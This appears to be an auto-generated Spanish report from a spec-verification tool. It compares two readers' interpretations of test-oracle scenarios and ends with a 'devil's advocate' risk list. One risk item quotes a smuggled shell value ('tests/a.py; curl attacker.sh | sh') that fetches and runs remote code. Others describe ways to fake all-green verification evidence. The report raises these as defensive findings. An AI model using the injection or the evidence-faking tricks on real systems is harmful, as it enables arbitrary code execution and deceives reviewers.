# Informe de divergencia

- **Lecturas:** `.venoxia/changes/2026-09-04-oracle/readings`
- **Lectores:** 2 (`reader-a`, `reader-b`)
- **Escenarios comparados:** 13
- **Umbral de similitud de `effect`:** 0.60
- **Modo estricto (`--strict`):** no
- **Código de salida:** 0

## Veredicto

**Las lecturas casi convergen.** 17 divergencias blandas sobre los 13 escenarios: el desacuerdo puede ser sólo de vocabulario, así que confírmalo antes de implementar. Las blandas por sí solas no hacen fallar la ejecución. Esta ejecución sale con código 0.

## Divergencias blandas · 17

Puede que sólo sea vocabulario distinto, o puede que no. Confírmalo antes de implementar.

### Escenario: Three requirements, three green tests

El lector A registra «marca cada requisito como green» y ningún otro lector lo recoge. Se han comparado «effect» y «side_effects» juntos, así que no es una diferencia de dónde colocó cada lector el mismo efecto. Ninguna otra lectura lo niega ni le pone otra cifra: nadie lo contradice en lo que se ha podido comprobar, así que sólo añade.

**¿Qué efectos observables debe producir «Three requirements, three green tests»?**
- (A) «marca cada requisito como green»
- (B) Ninguno de esos efectos pertenece al escenario: sobran de la lectura

### Escenario: Three requirements, three green tests

El lector A describe el efecto como «confirma que todos los requisitos del change pasan»; el lector B describe el efecto como «el oráculo reporta los tres requisitos en verde». Similitud de contenido 0.12, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «Three requirements, three green tests» es la correcta?**
- (A) «confirma que todos los requisitos del change pasan»
- (B) «el oráculo reporta los tres requisitos en verde»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: One red among three

El lector A registra «marca el requisito fallido como red con exit_code 1» y «marca los otros dos como green» y ningún otro lector lo recoge. Se han comparado «effect» y «side_effects» juntos, así que no es una diferencia de dónde colocó cada lector el mismo efecto. Ninguna otra lectura lo niega ni le pone otra cifra: nadie lo contradice en lo que se ha podido comprobar, así que sólo añade.

**¿Qué efectos observables debe producir «One red among three»?**
- (A) «marca el requisito fallido como red con exit_code 1» y «marca los otros dos como green»
- (B) Ninguno de esos efectos pertenece al escenario: sobran de la lectura

### Escenario: One red among three

El lector A describe el efecto como «identifica el requisito que falló entre varios»; el lector B describe el efecto como «reporta el requisito fallido con su código y motivo». Similitud de contenido 0.29, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «One red among three» es la correcta?**
- (A) «identifica el requisito que falló entre varios»
- (B) «reporta el requisito fallido con su código y motivo»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: verifies points to a file that was never written

El lector A describe el efecto como «detecta un test inexistente sin ejecutarlo»; el lector B describe el efecto como «marca el requisito como missing sin ejecutar el runner». Similitud de contenido 0.00, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «verifies points to a file that was never written» es la correcta?**
- (A) «detecta un test inexistente sin ejecutarlo»
- (B) «marca el requisito como missing sin ejecutar el runner»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: A runner that sleeps past the limit

El lector A registra «mata el proceso del test_command» y ningún otro lector lo recoge. Se han comparado «effect» y «side_effects» juntos, así que no es una diferencia de dónde colocó cada lector el mismo efecto. Ninguna otra lectura lo niega ni le pone otra cifra: nadie lo contradice en lo que se ha podido comprobar, así que sólo añade.

**¿Qué efectos observables debe producir «A runner that sleeps past the limit»?**
- (A) «mata el proceso del test_command»
- (B) Ninguno de esos efectos pertenece al escenario: sobran de la lectura

### Escenario: A runner that sleeps past the limit

El lector A describe el efecto como «corta la ejecución que excede el tiempo límite»; el lector B describe el efecto como «marca el requisito como timeout». Similitud de contenido 0.00, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «A runner that sleeps past the limit» es la correcta?**
- (A) «corta la ejecución que excede el tiempo límite»
- (B) «marca el requisito como timeout»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: No traceback after a timeout

El lector A describe el efecto como «informa el timeout sin volcar traza de error»; el lector B describe el efecto como «stderr no muestra ningún traceback». Similitud de contenido 0.00, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «No traceback after a timeout» es la correcta?**
- (A) «informa el timeout sin volcar traza de error»
- (B) «stderr no muestra ningún traceback»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: The project never wrote venoxia.json

El lector A describe el efecto como «rechaza la ejecución por falta de configuración»; el lector B describe el efecto como «mensaje en español nombra el fichero faltante con ejemplo». Similitud de contenido 0.00, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «The project never wrote venoxia.json» es la correcta?**
- (A) «rechaza la ejecución por falta de configuración»
- (B) «mensaje en español nombra el fichero faltante con ejemplo»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: test_command forgot the placeholder

El lector A describe el efecto como «rechaza un test_command sin el marcador requerido»; el lector B describe el efecto como «mensaje en español nombra el marcador {files} faltante». Similitud de contenido 0.10, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «test_command forgot the placeholder» es la correcta?**
- (A) «rechaza un test_command sin el marcador requerido»
- (B) «mensaje en español nombra el marcador {files} faltante»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: Dry run over a change with two requirements

El lector A describe el efecto como «muestra los comandos sin ejecutar ningún test»; el lector B describe el efecto como «imprime un comando por requisito sin invocar el runner». Similitud de contenido 0.11, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «Dry run over a change with two requirements» es la correcta?**
- (A) «muestra los comandos sin ejecutar ningún test»
- (B) «imprime un comando por requisito sin invocar el runner»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: Two runs in a row

El lector A registra «añade un run a oracle.json conservando el anterior» y ningún otro lector lo recoge; el lector B registra «oracle.json contiene dos runs» y ningún otro lector lo recoge. Se han comparado «effect» y «side_effects» juntos, así que no es una diferencia de dónde colocó cada lector el mismo efecto. Ninguna otra lectura lo niega ni le pone otra cifra: nadie lo contradice en lo que se ha podido comprobar, así que sólo añade.

**¿Qué efectos observables debe producir «Two runs in a row»?**
- (A) «añade un run a oracle.json conservando el anterior»
- (B) «oracle.json contiene dos runs»
- (C) Ninguno de esos efectos pertenece al escenario: sobran de la lectura

### Escenario: Two runs in a row

El lector A describe el efecto como «acumula un segundo run en el historial»; el lector B describe el efecto como «el historial acumula los dos runs ejecutados». Similitud de contenido 0.29, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «Two runs in a row» es la correcta?**
- (A) «acumula un segundo run en el historial»
- (B) «el historial acumula los dos runs ejecutados»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: The history file is corrupt

El lector A describe el efecto como «descarta el historial corrupto y empieza uno nuevo»; el lector B describe el efecto como «el historial corrupto se sustituye por uno nuevo». Similitud de contenido 0.57, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «The history file is corrupt» es la correcta?**
- (A) «descarta el historial corrupto y empieza uno nuevo»
- (B) «el historial corrupto se sustituye por uno nuevo»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: A corrupt history warns without a traceback

El lector A describe el efecto como «avisa del historial corrupto sin volcar traza de error»; el lector B describe el efecto como «stderr recibe un aviso sin traceback». Similitud de contenido 0.11, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «A corrupt history warns without a traceback» es la correcta?**
- (A) «avisa del historial corrupto sin volcar traza de error»
- (B) «stderr recibe un aviso sin traceback»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: The top-level keys never change

El lector A describe el efecto como «expone exactamente el mismo esquema de claves»; el lector B describe el efecto como «el JSON expone exactamente las ocho claves de primer nivel». Similitud de contenido 0.33, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «The top-level keys never change» es la correcta?**
- (A) «expone exactamente el mismo esquema de claves»
- (B) «el JSON expone exactamente las ocho claves de primer nivel»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

### Escenario: Two paths, one invocation

El lector A describe el efecto como «pasa ambas rutas al runner en una sola llamada»; el lector B describe el efecto como «el runner se invoca una sola vez con las dos rutas». Similitud de contenido 0.33, por debajo del umbral 0.60. Se comparan las palabras que dicen algo, sin artículos ni conjugación.

**¿Cuál de estas lecturas del efecto de «Two paths, one invocation» es la correcta?**
- (A) «pasa ambas rutas al runner en una sola llamada»
- (B) «el runner se invoca una sola vez con las dos rutas»
- (C) Ambas lecturas describen lo mismo con otras palabras, no hay divergencia real

## Abogado del diablo · 6

Implementaciones que cumplirían el delta al pie de la letra y aun así serían inaceptables.

- **[high]** R-ORC-001 — Un change cuyo `delta/` no declara ningún requisito satisface el requisito de forma vacía: no hay ninguno en rojo, así que la implementación literal responde `all_green: true`, `counts.total: 0` y código `0`. El oráculo certifica como «todo verde» un change que no ha ejecutado ni un test, y ese run verde es exactamente la evidencia que `/venoxia:verify` y V17 usan para promover el change a `verified`.
- **[high]** R-ORC-005 — La única comprobación exigida sobre `test_command` es que contenga `{files}`, así que un proyecto con `test_command: "true {files}"` (o `echo {files}`) pasa la validación y devuelve código `0` para todos los requisitos: `all_green: true` sin haber ejecutado un solo test. Nada obliga al oráculo a verificar que la ruta de `verifies:` contenga realmente un test ni que ese test declare `@covers` del requisito, con lo que un fichero vacío también cuenta como verde y el change queda `verified` sin cobertura alguna.
- **[high]** R-ORC-008 — «El `test_command` ya sustituido por sus rutas de `verifies:`» y «pasarlas todas al mismo `test_command` en una sola invocación» se cumplen literalmente concatenando los valores de `verifies:` dentro de la cadena del comando y ejecutándola por shell, sin entrecomillado ni validación de la ruta. Un requisito con `verifies: tests/a.py; curl attacker.sh | sh` ejecuta código arbitrario en la máquina de quien corra `oracle.py` o `gate.py` sobre ese change (CI incluido), y basta con que el delta pase el validador para colarlo.
- **[high]** R-ORC-007 — «WHEN ese fichero ya existe pero su contenido no es JSON válido, sustituirlo por un historial nuevo avisando por stderr» se cumple truncando `oracle.json` y escribiendo un único run, sin copia previa. Cualquiera que añada un byte al fichero (o una escritura interrumpida) borra de forma irreversible todo el historial de verificación, incluido el run rojo previo que el ciclo exige como prueba de que el test falló antes del código; el aviso es una línea de stderr que en CI nadie lee.
- **[high]** R-ORC-006 — Nada prohíbe combinar `--dry-run` con `--record`: la implementación literal no invoca al runner (R-ORC-006) y a la vez añade la ejecución al historial (R-ORC-007), quedando en `oracle.json` un run sin un solo test ejecutado y sin ningún resultado rojo, es decir indistinguible de un verde legítimo para el auditor que sólo lee el disco. Es una forma trivial de fabricar la evidencia que promueve un change a `verified`.
- **[medium]** R-ORC-004 — El corte de tiempo sólo existe «más allá de `--timeout`»: si no se pasa la opción, la implementación literal no está obligada a aplicar ningún límite y un test que se cuelga deja al oráculo (y a `gate.py`, que lo invoca por cada change) bloqueado indefinidamente. Tampoco hay cota agregada: con el timeout por requisito, un change de N requisitos puede tardar N × timeout sin que nada lo impida.
